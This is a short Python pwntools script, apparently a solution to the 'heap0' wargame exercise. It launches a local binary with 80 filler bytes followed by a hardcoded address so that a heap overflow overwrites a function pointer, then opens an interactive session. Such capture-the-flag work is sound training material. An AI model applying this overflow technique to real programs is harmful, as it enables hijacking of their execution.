import pwn as p

target = p.process(['./heap0', 0x50*b"\x30"+b"\xb6\x84\x04\x08"])
target.interactive()
